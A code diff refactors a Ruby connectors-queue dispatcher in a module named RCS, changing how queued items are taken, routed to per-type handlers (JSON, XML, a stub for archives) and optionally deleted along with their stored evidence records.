@@ -7,9 +7,6 @@ module RCS
       extend RCS::Tracer
       extend self
 
-      # Pops out an item from the connectors queue and sends it
-      # the the #process method. This method is called periodically
-      # using an EM timer.
       def dispatch
         unless can_dispatch?
           trace :warn, "Cannot dispatch connectors queue due to license limitation."
@@ -17,14 +14,10 @@ module RCS
           return
         end
 
-        @status_message = "idle"
+        connector_queue = ConnectorQueue.take
+        return unless connector_queue
 
-        ary = ConnectorQueue.get_queued
-        return if ary.blank?
-
-        connector_queue, remaining_count = *ary
-
-        @status_message = "processing evidences. #{remaining_count} in queue"
+        @status_message = "working"
 
         process(connector_queue)
 
@@ -35,30 +28,43 @@ module RCS
         raise(ex)
       end
 
-      # Attribute reader for @status_message with default fallback
-      # to "unknown"
       def status_message
-        (@status_message || 'unknown').capitalize
+        (@status_message || "idle").capitalize
       end
 
-      # Processes an item coming from the connectors queue. It dumps the
-      # related evidence following the connector(s) rules and (eventually)
-      # it destroy the evidence at the end.
-      def process connector_queue
-        trace :debug, "Processing ConnectorQueue item #{connector_queue.id}"
+      def destroy_evidence(connector_queue)
+        data = connector_queue.data
+        return unless data['target_id']
+        return unless data['evidence_id']
+        evidence = ::Evidence.collection_class(data['target_id']).find(data['evidence_id'])
+        evidence.destroy
+      end
 
-        target = ::Item.targets.find(connector_queue.tg_id)
-        evidence = ::Evidence.collection_class(target).find(connector_queue.ev_id)
-        connectors = ::Connector.any_in(id: connector_queue.cn_ids)
+      def process(connector_queue)
+        trace :debug, "Processing ConnectorQueue #{connector_queue.id}, #{connector_queue.data.inspect}"
+
+        connectors = connector_queue.connectors
 
         connectors.each do |connector|
-          dump(evidence, connector)
+          method_to_call = :"process_#{connector.type}".downcase
+          send(method_to_call, connector, connector_queue.data)
+          connector_queue.complete(connector)
         end
 
-        if RCS::DB::Connectors.discard_evidence?(connectors)
-          trace :debug, "Deleting evidence #{evidence.id} due to matching connectors settings"
-          evidence.destroy
-        end
+        destroy_evidence(connector_queue) unless connector_queue.keep?
+        connector_queue.destroy
+      end
+
+      def process_json(connector, data)
+        target = ::Item.targets.find(data['target_id'])
+        evidence = ::Evidence.collection_class(target).find(data['evidence_id'])
+        dump(evidence, connector)
+      end
+
+      alias :process_xml :process_json
+
+      # TODO
+      def process_archive(connector, data)
       end
 
       # Checks the license
